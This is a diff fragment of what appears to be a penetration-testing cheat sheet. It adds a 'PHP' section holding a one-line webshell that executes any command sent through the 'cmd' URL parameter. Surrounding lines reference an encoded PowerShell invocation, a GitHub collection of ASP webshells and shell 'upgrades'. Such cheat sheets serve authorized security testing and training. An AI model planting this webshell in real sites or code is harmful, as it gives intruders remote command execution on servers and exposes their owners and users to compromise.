@@ -45,6 +45,13 @@ powershell -a "-enc <base64>"
 https://github.com/tennc/webshell/tree/master/fuzzdb-webshell/asp
 ```
 
+### PHP
+
+```
+#Webshell
+<?php system($_GET['cmd']); ?>
+```
+
 #### Upgrades
 ```
 #interactive upgrade
